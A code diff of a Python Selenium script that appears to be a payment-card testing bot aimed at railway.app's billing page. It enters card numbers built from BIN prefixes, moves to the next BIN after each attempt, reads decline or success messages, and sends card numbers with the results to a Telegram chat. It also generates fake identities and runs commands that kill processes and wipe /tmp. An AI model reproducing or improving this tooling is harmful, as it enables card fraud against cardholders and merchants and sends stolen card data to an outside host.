@@ -42,7 +42,7 @@ def send_msg(text):
 	chat_id = "-1001790110973"
 	url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + mmssg 
 	results = requests.get(url_req)
-	print(results.json())
+	# print(results.json())
 
 
 # def send_msg(text):
@@ -188,7 +188,7 @@ def fill_form_one(driver):
 	# print(url_get_text)
 	iframes = driver.find_elements_by_xpath("//iframe")
 	lin=len(iframes)
-	print(str(lin))
+	# print(str(lin))
 	if lin ==1:
 		# input("")
 		time.sleep(4)
@@ -198,7 +198,7 @@ def fill_form_one(driver):
 		driver.switch_to.frame(iframe)
 		time.sleep(1)
 		EMAIL_CASE=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/form/div/div[2]/span[1]/span[2]/div/div[2]/span/input')))
-		print("oook")
+		# print("oook")
 
 	else:
 		driver.switch_to.frame(2)
@@ -222,13 +222,13 @@ def fill_form_one(driver):
 	# 			driver.switch_to.parent_frame()
 	# 			time.sleep(1)
 	#/html/body/div/form/div/div[2]/span[1]/span[2]/div/div[2]/span/input
-	print("oook")
+	# print("oook")
 	# EMAIL_CASE.send_keys("4000179977987837")
 	# time.sleep(2)
 	# EMAIL_CASE.send_keys("0723")
 	emm=usr_ar[7]
-	print(caed_ar[0]+usr_ar[7])
-	print(usr_ar[6])
+	# print(caed_ar[0]+usr_ar[7])
+	# print(usr_ar[6])
 	
 	# EMAIL_CASE.send_keys(Keys.CONTROL+'a' )
 	# EMAIL_CASE.send_keys(Keys.BACKSPACE )
@@ -238,7 +238,7 @@ def fill_form_one(driver):
 	# input('')
 
 
-	print("number card")
+	# print("number card")
 	driver.switch_to.default_content()
 	time.sleep(3)
 	# input("5")
@@ -272,7 +272,7 @@ def fill_form_one(driver):
 
 
 	# #
-	print(caed_ar)
+	# print(caed_ar)
 	
 	check_general_form_one(driver,caed_ar)
 	# check_general_form2(driver,caed_ar)
@@ -283,56 +283,6 @@ def fill_form_one(driver):
 
 #############################--------------------------------------------------------------------------
 
-def fill_form_tow(driver,url_get_text):
-
-	print("fill_form_tow ...... ",end='',flush=True)
-	caed_ar=bin_operation()
-	# input("5")
-	time.sleep(1)
-	#//*[@id="encryptedExpiryDate"]
-	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[0])
-	time.sleep(1)
-	CARD_RD_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedCardNumber"]')))
-	CARD_RD_CASE.click()
-	CARD_RD_CASE.send_keys(Keys.CONTROL+'a' )
-	CARD_RD_CASE.send_keys(Keys.BACKSPACE )
-	CARD_RD_CASE.send_keys(caed_ar[0])
-	# CARD_RD_CASE.send_keys(Keys.TAB*2,caed_ar[1])
-	# CARD_RD_CASE.send_keys(Keys.TAB*2,caed_ar[2])
-	# #
-	print("number card")
-	driver.switch_to.default_content()
-	time.sleep(1)
-	# input("5")
-	#//*[@id="encryptedExpiryDate"]
-	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[1])
-	time.sleep(1)
-	CARD_EXP_DATE_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedExpiryDate"]')))
-
-	time.sleep(1)
-	CARD_EXP_DATE_CASE.click()
-	CARD_EXP_DATE_CASE.send_keys(Keys.CONTROL+'a' )
-	CARD_EXP_DATE_CASE.send_keys(Keys.BACKSPACE )
-	CARD_EXP_DATE_CASE.send_keys(caed_ar[1])
-	time.sleep(1)
-	# CARD_EXP_DATE_CASE.send_keys(Keys.TAB*2, caed_ar[2])
-	driver.switch_to.default_content()
-	print("CARD_EXP_DATE_CASE")
-	# input("5")
-	time.sleep(1)
-	driver.switch_to.frame(driver.find_elements_by_tag_name("iframe")[2])
-	time.sleep(1)
-	CARD_CVV_CASE=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="encryptedSecurityCode"]')))
-	CARD_CVV_CASE.click()
-	# time.sleep(2)
-	CARD_CVV_CASE.send_keys(caed_ar[2])
-	driver.switch_to.default_content()
-	time.sleep(1)
-	#
-	CONTINUE_BUTTON=WebDriverWait(driver,10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div/div[2]/div[2]/div/div[2]/div[1]/form/div[2]/button')))
-	CONTINUE_BUTTON.click()
-	time.sleep(6)
-	check_general_form2(driver,caed_ar)
 
 	# input("date expiration")
 
@@ -340,7 +290,7 @@ def check_general_form_one(driver,caed_ar):
 	#messzge telegram
 	msg_test_log="U N D E F I N E D"
 	card_number=caed_ar[0]
-	extract_bin=" [ "+card_number[0:8]+" ] "
+	extract_bin=" [ "+card_number[0:6]+" ] "
 	# input("")
 	# /html/body/div/div/div[1]/div[2]/div[2]/main/section/div/section/div[3]/div/form/div/div[2]/div/svg
 	# /html/body/div/div/div[1]/div[2]/div[2]/main/section/div/section/div[3]/div/form/div/div[2]/div/svg
@@ -357,7 +307,8 @@ def check_general_form_one(driver,caed_ar):
 		driver.get("https://railway.app/account/billing")
 		fill_form_one(driver)
 	except Exception as e:
-		print("Correct Card")
+		# print("Correct Card")
+		pass
 	try:
 		
 		print("CHECK THE PAGE F1 ...... ",end='',flush=True)
@@ -368,31 +319,37 @@ def check_general_form_one(driver,caed_ar):
 
 		# input('')
 		if "Please use a different card," in url_get_text:
-			add_to_last_bin()
+			
 			telegram_msg=" "+msg_test_log+extract_bin+card_number
-			send_msg(telegram_msg)
+			# send_msg(telegram_msg)
 			#fill_form_tow(driver,url_get_text)
 
 		#form__input -feedback -error -m-half
 		if "Your card does not support this type of purchase" in url_get_text:
-			add_to_last_bin()
+			# add_to_last_bin()
 			telegram_msg=" "+msg_test_log+extract_bin+card_number
-			send_msg(telegram_msg)
+			
 			#fill_form_tow(driver,url_get_text)
 		if "incorrect" in url_get_text:
-			add_to_last_bin()
+			# add_to_last_bin()
 			telegram_msg=" "+msg_test_log+extract_bin+card_number
-			send_msg(telegram_msg)
+			# send_msg(telegram_msg)
 			#fill_form_tow(driver,url_get_text)
 		if "declined" in url_get_text:
-			add_to_last_bin()
+			# add_to_last_bin()
 			telegram_msg=" "+msg_test_log+extract_bin+card_number
-			send_msg(telegram_msg)
+			# send_msg(telegram_msg)
 			#fill_form_tow(driver,url_get_text)
 
 	except Exception as e:
 		print(e)
 		add_to_last_bin()
+	#/html/body/div/div/div[1]/div[2]/div[2]/main/section/div/section/p/b
+	URL_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div/div[1]/div[2]/div[2]/main/section/div/section/p/b')))
+	url_get_text=" ["+URL_BUTTON.text+" ] "
+	send_msg(url_get_text+" "+telegram_msg)
+	add_to_last_bin()
+
 	driver.get("https://railway.app/account/billing")
 	# input('')
 	fill_form_one(driver)
@@ -425,53 +382,6 @@ def check_general_form_one(driver,caed_ar):
 
 #form__input -feedback -error -m-half 52298708 52297399
 #----------------------------------------------------------------------------------------------------
-
-def check_general_form2(driver,caed_ar):
-
-	card_number=caed_ar[0]
-	extract_bin=" [ "+card_number[0:8]+" ] "
-
-
-	try:
-		print("CHECK THE PAGE 2 F2 ...... ",end='',flush=True)
-		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
-		url_get_text=URL_BUTTON.text
-		if "Please use a different card," in url_get_text:
-			telegram_msg="DECLINE :interrobang: "+extract_bin+card_number
-			add_to_last_bin()
-			send_msg(telegram_msg)
-			fill_form_tow(driver,url_get_text)
-
-		if "try again" in url_get_text:
-			telegram_msg="INCORECT :interrobang:  "+extract_bin+card_number
-			add_to_last_bin()
-			send_msg(telegram_msg)
-
-			fill_form_tow(driver,url_get_text)		
-	except Exception as e:
-		print(e)
-
-
-	try:
-		print("CHECK THE PAGE 3 F2 ...... ",end='',flush=True)
-		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
-		url_get_text=URL_BUTTON.text
-		if "chosen your Stan plan" in url_get_text:
-			telegram_msg="SUCCESS :white_check_mark "+extract_bin+card_number
-			add_to_last_bin()
-			send_msg(telegram_msg)
-			end_success(driver)
-
-		if "try again" in url_get_text:
-			telegram_msg="INCORECT   :interrobang:  "+extract_bin+card_number
-			add_to_last_bin()
-			send_msg(telegram_msg)
-
-			fill_form_tow(driver,url_get_text)		
-	except Exception as e:
-		print(e)
-
-
 
 
 def check_general(driver):
@@ -524,6 +434,7 @@ def lets_play(serv,ops):
 
 		print(emoji.emojize("Ok "' :check_mark_button: :alien:'))
 		driver.get("https://railway.app/account/billing")
+
 		# input('')
 		
 		# EMAIL_BUTTON=WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.form__group')))
@@ -575,7 +486,7 @@ def init_fire():
 		#
 		os.system("ps aux | grep -i openvpn | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
 		os.system("ps aux | grep -i Xephyr | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
-		os.system("ps aux | grep -i geckodriver13 | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
+		os.system("ps aux | grep -i geckodriver-22 | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
 		os.system("ps aux | grep -i Xvfb | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
 		os.system("rm -rf /tmp/*") 
 		time.sleep(5)
@@ -641,7 +552,7 @@ def user_information():
 	arry_user_all_info=[]
 
 	arry_usr_info=t00l_.generate_name_add()
-	print(arry_usr_info)
+	# print(arry_usr_info)
 	full_name=arry_usr_info[1].split(" ")
 	# print(full_name)
 	date_off_birthday=arry_usr_info[2].split("-")
@@ -656,7 +567,7 @@ def user_information():
 	post_code = arry_usr_info[3]
 	email_usr = arry_usr_info[4]
 	arry_user_all_info.extend((password,first_name,last_name,dd_birth,mm_birth,yy_birth,post_code,email_usr))
-	print(arry_user_all_info)
+	# print(arry_user_all_info)
 	# for i in arry_user_all_info:
 	# 	print(i)
 	return arry_user_all_info #password,first_name,last_name,dd_birth,mm_birth,yy_birth,post_code
@@ -712,7 +623,7 @@ def bin_operation():
 
 def add_to_last_bin():
 	l_bin=read_the_last_bin()
-	print(l_bin)
+	# print(l_bin)
 	new_bin=int(l_bin)+1
 	binani=str(new_bin)
 	#################
